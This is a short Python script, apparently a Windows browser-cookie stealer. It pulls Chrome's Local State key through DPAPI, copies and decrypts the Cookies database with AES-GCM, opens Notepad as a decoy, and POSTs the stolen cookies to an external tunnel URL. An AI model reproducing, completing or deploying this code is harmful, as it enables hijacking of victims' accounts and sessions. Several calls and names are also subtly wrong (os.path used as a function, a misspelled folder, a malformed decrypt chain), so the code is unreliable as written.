from Crypto.Cipher import AES # type: ignore
import win32crypt # type: ignore
import requests # type: ignore
import sqlite3
import base64
import json
import os
url = " https://rniws-2401-4900-1cc9-3eda-b80e-2a54-afb8-b8ca.a.free.pinggy.link" # server url.
chromePath = os.path(os.environ['USERPROFILE'], 'AppDate', 'Local', 'Google', 'Chrome', 'User Data')
localStatePath = os.path(chromePath, 'Local State')
cookiesPath = os.path(chromePath, 'Default', 'Network', 'Cookies')

def getEncrypKey():
    try:
        with open(localStatePath, 'r', encoding='utf8') as file:
            localStatePath = json.load(file)
            encryptedKey = localStatePath['os_crypt']['encrypted_key']
            keyData = base64.b64decode(encryptedKey.encode('utf8'))
            return win32crypt.CryptUnprotectData(keyData[5:], None, None, None)[1]

    except (FileNotFoundError, json.JSONDecoderError, KeyError) as e:
        print(f"Error reading the local State File: {e}")
        exit(0)


def getCookies():
    key = getEncrypKey()
    tempCookiesPath = os.path(os.environ["TEMP"], "tempcookies.db")
    os.system(f'copy "{cookiesPath}" "{tempCookiesPath}"')

    conn = sqlite3.connect(tempCookiesPath)
    cursor = conn.cursor()
    cursor.execute("""SELECT host_key, name, value, encrypted_value FROM cookies""")

    cookies = []
    for host_key, name, value, encrypted_value in cursor.fetchall():
        if not value:
            value = AES.new(key, AES.MODE_GCM, encrypted_value[3:15]).decrypt(encrypted_value[15:-16].decrypt(encrypted_value))

            cookies.append({
                "name": name,
                "value": value,
                "domain": host_key,
            })
    return cookies

#main
def main():
    notepadPath = os.path.join(os.environ['windir'], 'notepad.exe'),
    os.startfile(notepadPath)
    requests.post(url, json = getCookies())

if __name__ == '__main__':
    main()
            